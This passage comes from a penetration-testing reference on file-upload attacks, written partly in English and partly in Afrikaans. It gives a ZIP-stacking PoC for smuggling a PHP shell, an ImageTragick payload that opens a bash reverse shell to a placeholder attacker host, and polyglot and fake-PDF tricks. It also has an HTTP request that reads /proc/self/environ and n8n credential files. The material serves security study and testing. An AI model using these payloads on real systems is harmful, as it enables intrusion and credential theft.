Concatenating two valid ZIP files produces a blob where different parsers focus on different EOCD records. Many tools locate the last End Of Central Directory (EOCD), while some libraries (e.g., ZipArchive in specific workflows) may parse the first archive they find. If validation enumerates the first archive and extraction uses another tool that honors the last EOCD, a benign archive can pass checks while a malicious one gets extracted.

PoC:
```bash
# Build two separate archives
printf test > t1; printf test2 > t2
zip zip1.zip t1; zip zip2.zip t2

# Stack them
cat zip1.zip zip2.zip > combo.zip

# Different views
unzip -l combo.zip   # warns about extra bytes; often lists entries from the last archive
php -r '$z=new ZipArchive; $z->open("combo.zip"); for($i=0;$i<$z->numFiles;$i++) echo $z->getNameIndex($i),"\n";'
```
Abuse pattern
- Skep ’n onskadelike argief (toegelate tipe, bv. ’n PDF) en ’n tweede argief wat ’n geblokkeerde uitbreiding bevat (bv. `shell.php`).
- Kombineer hulle: `cat benign.zip evil.zip > combined.zip`.
- As die bediener valideer met een parser (sien benign.zip) maar ekstraheer met ’n ander (verwerk evil.zip), beland die geblokkeerde lêer in die ekstraksiepad.

## ImageTragic

Laai hierdie inhoud met ’n beelduitbreiding op om die kwesbaarheid uit te buit **(ImageMagick , 7.0.1-1)** (van die [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Insluiting van 'n PHP-shell in PNG

Die insluiting van 'n PHP-shell in die IDAT chunk van 'n PNG-lêer kan sekere beeldverwerkingsoperasies effektief omseil. Die funksies `imagecopyresized` en `imagecopyresampled` van PHP-GD is veral relevant in hierdie konteks, aangesien hulle algemeen gebruik word vir resizing en resampling van beelde. Die vermoë van die ingeslote PHP-shell om deur hierdie operasies ongedeerd te bly, is 'n beduidende voordeel vir sekere toepassings.

'n Gedetaileerde verkenning van hierdie tegniek, insluitende die metodologie en moontlike toepassings, word in die volgende artikel verskaf: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Hierdie bron bied 'n omvattende begrip van die proses en die implikasies daarvan.

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot-lêers

Polyglot-lêers dien as 'n unieke hulpmiddel in kuberveiligheid, werk soos kameleons wat geldig in meerdere lêerformate terselfdertyd kan bestaan. 'n Interessante voorbeeld is 'n [GIFAR](https://en.wikipedia.org/wiki/Gifar), 'n hibriede wat beide as 'n GIF en 'n RAR-argief funksioneer. Sulke lêers beperk hulle nie tot hierdie kombinasie nie; kombinasies soos GIF en JS of PPT en JS is ook moontlik.

Die kernnut van polyglot-lêers lê in hul vermoë om sekuriteitsmaatreëls te omseil wat lêers op grond van tipe sifting. Algemene praktyk in verskeie toepassings behels dat net sekere lêertipes vir upload toegelaat word—soos JPEG, GIF of DOC—om die risiko wat deur moontlik skadelike formate (bv. JS, PHP of Phar-lêers) aangebied word, te verminder. 'n Polyglot, deur aan die strukturele kriteria van meerdere lêertipes te voldoen, kan egter stilweg hierdie beperkings omseil.

Ten spyte van hul aanpasbaarheid, tref polyglots beperkings. Byvoorbeeld, terwyl 'n polyglot tegelyk 'n PHAR-lêer (PHp ARchive) en 'n JPEG kan beliggaam, kan die sukses van sy upload afhanklik wees van die platform se beleid oor lêeruitbreidings. As die stelsel streng is oor toegelate uitbreidings, mag die slegs strukturele dualiteit van 'n polyglot nie voldoende wees om die upload te verseker nie.

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Upload geldige JSONs asof dit 'n PDF is

Hoe om lêertipe-detektering te omseil deur 'n geldige JSON-lêer op te laai, selfs al is dit nie toegelaat nie, deur 'n PDF-lêer te vervals (tegnieke uit **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Solank die `%PDF` magic bytes in die eerste 1024 bytes is, is dit geldig (sien voorbeeld in die post)
- **`pdflib` library**: Voeg 'n vals PDF-formaat binne 'n veld van die JSON by sodat die library dink dit is 'n pdf (sien voorbeeld in die post)
- **`file` binary**: Dit kan tot 1048576 bytes vanaf 'n lêer lees. Skep eenvoudig 'n JSON groter as dit sodat dit die inhoud nie as 'n json kan ontleed nie, en sit dan binne die JSON die aanvanklike deel van 'n werklike PDF en dit sal dink dis 'n PDF

### Content-Type verwarring tot arbitraire lêerlees

Sommige upload handlers **vertrou die ontlede versoekligchaam** (bv. `context.getBodyData().files`) en kopieer later **die lêer vanaf `file.filepath`** sonder eers `Content-Type: multipart/form-data` af te dwing. As die bediener `application/json` aanvaar, kan jy 'n vals `files`-objek voorsien wat `filepath` na **enige plaaslike pad** wys, wat die uploadvloei in 'n arbitraire lêerlees-primitive omskep.

Voorbeeld POST teen 'n form workflow wat die opgelaaide binêr in die HTTP-antwoord teruggee:
```http
POST /form/vulnerable-form HTTP/1.1
Host: target
Content-Type: application/json

{
"files": {
"document": {
"filepath": "/proc/self/environ",
"mimetype": "image/png",
"originalFilename": "x.png"
}
}
}
```
Die backend kopieer `file.filepath`, sodat die response die inhoud van daardie pad teruggee. Tipiese ketting: lees `/proc/self/environ` om `$HOME` te vind, dan `$HOME/.n8n/config` vir sleutels en `$HOME/.n8n/database.sqlite` vir gebruikersidentifikasies.

## Verwysings

- [n8n form upload Content-Type confusion → arbitrary file read PoC](https://github.com/Chocapikk/CVE-2026-21858)
- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Microsoft – mklink (command reference)](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [0xdf – HTB: Certificate (ZIP NUL-name and stacked ZIP parser confusion → PHP RCE)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../banners/hacktricks-training.md}}
